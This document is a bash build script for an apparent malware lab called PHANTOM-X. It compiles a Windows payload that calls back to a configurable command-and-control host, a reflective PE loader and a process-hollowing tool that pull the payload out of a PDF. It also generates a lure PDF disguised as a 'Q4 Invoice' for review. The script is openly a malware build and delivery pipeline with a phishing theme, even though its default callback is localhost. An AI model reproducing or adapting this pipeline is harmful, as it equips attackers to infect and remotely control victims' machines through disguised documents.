#!/usr/bin/env bash
# =============================================================================
# PHANTOM-X :: build_lab.sh -- build the loader and payload from source
# =============================================================================
# Builds the two Windows binaries and regenerates the attack-chain PDF.
#
#   ./build_lab.sh                 # build with MinGW (recommended)
#   ./build_lab.sh --clean         # remove build artefacts first
#
# The produced binaries are self-contained: they import only KERNEL32.dll,
# msvcrt.dll and WS2_32.dll, all of which are present on a stock Windows
# installation. No extra DLL needs to be shipped alongside them.
# =============================================================================
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"
PAYLOAD="$HERE/px_payload.exe"
LOADER="$HERE/px_loader.exe"
HOLLOW="$HERE/px_hollow.exe"
PDF="$ROOT/phase1_pdf/samples/px_attack_chain.pdf"

# Host that the payload calls back to. Override with:
#   C2_HOST=192.168.56.1 C2_PORT=9001 ./build_lab.sh
C2_HOST="${C2_HOST:-127.0.0.1}"
C2_PORT="${C2_PORT:-9001}"

CC="${CC:-x86_64-w64-mingw32-gcc}"
ZLIB_A="${ZLIB_A:-/usr/x86_64-w64-mingw32/lib/libz.a}"

red()   { printf '\033[31m%s\033[0m\n' "$*"; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
info()  { printf '\033[36m==>\033[0m %s\n' "$*"; }

if [ "${1:-}" = "--clean" ]; then
    info "cleaning"
    rm -f "$PAYLOAD" "$LOADER"
fi

command -v "$CC" >/dev/null 2>&1 || { red "error: $CC not found (install mingw-w64)"; exit 1; }
[ -f "$ZLIB_A" ] || { red "error: static zlib not found at $ZLIB_A"; exit 1; }

# -----------------------------------------------------------------------------
# 1. Payload -- freestanding, reflective-loadable
#
#    -nostdlib + a custom entry point is REQUIRED, not stylistic. A normally
#    built MinGW executable cannot be run from a hand-mapped image: its CRT
#    startup needs a thread-local-storage index that only the Windows loader
#    assigns. This was observed as an immediate page fault inside the CRT
#    entry point. Removing the CRT removes the dependency.
# -----------------------------------------------------------------------------
info "building payload (freestanding, entry=px_entry)"
"$CC" -O2 -Wall -Wextra \
      -nostdlib -fno-builtin \
      -DPX_DEFAULT_HOST="\"$C2_HOST\"" \
      -DPX_DEFAULT_PORT="$C2_PORT" \
      -Wl,--entry=px_entry -Wl,--subsystem,console \
      -o "$PAYLOAD" "$HERE/px_payload.c" \
      -lgcc -lkernel32 -lws2_32
green "    $PAYLOAD"

# -----------------------------------------------------------------------------
# 2. Loader -- PDF parser + reflective PE mapper
#
#    zlib is linked STATICALLY so the result is a single self-contained EXE
#    with no zlib1.dll dependency.
# -----------------------------------------------------------------------------
info "building loader (PDF extractor + reflective PE mapper)"
"$CC" -O2 -Wall -Wextra \
      -o "$LOADER" "$HERE/px_loader.c" \
      "$ZLIB_A" -lws2_32
green "    $LOADER"

# -----------------------------------------------------------------------------
# 2b. Hollow tool -- extract from PDF, map into a target process, run there
# -----------------------------------------------------------------------------
info "building hollow tool (PDF extractor + remote PE mapper)"
"$CC" -O2 -Wall -Wextra \
      -o "$HOLLOW" "$HERE/px_hollow.c" \
      "$ZLIB_A" -lws2_32
green "    $HOLLOW"

# -----------------------------------------------------------------------------
# 3. Attack-chain PDF
# -----------------------------------------------------------------------------
info "generating attack-chain PDF"
python3 "$ROOT/phase1_pdf/make_attack_pdf.py" \
        --payload "$PAYLOAD" \
        --out "$PDF" \
        --name "Q4_Invoice_2026.pdf" \
        --attachment "Q4 Invoice" \
        --subject "Q4 Invoice for review"

# -----------------------------------------------------------------------------
# 4. Report
# -----------------------------------------------------------------------------
info "imports"
for f in "$PAYLOAD" "$LOADER" "$HOLLOW"; do
    printf '    %s:\n' "$(basename "$f")"
    x86_64-w64-mingw32-objdump -p "$f" 2>/dev/null | grep "DLL Name" | sed 's/^/      /'
done

info "sizes"
ls -l "$PAYLOAD" "$LOADER" "$HOLLOW" | awk '{printf "    %-16s %8s bytes\n", $NF, $5}'

green ""
green "build complete."
green "  loader : $LOADER"
green "  hollow : $HOLLOW"
green "  payload: $PAYLOAD"
green "  pdf    : $PDF"
green "  c2     : ${C2_HOST}:${C2_PORT}"
green ""
green "next:  python3 phase5_network/test_chain_integration.py"
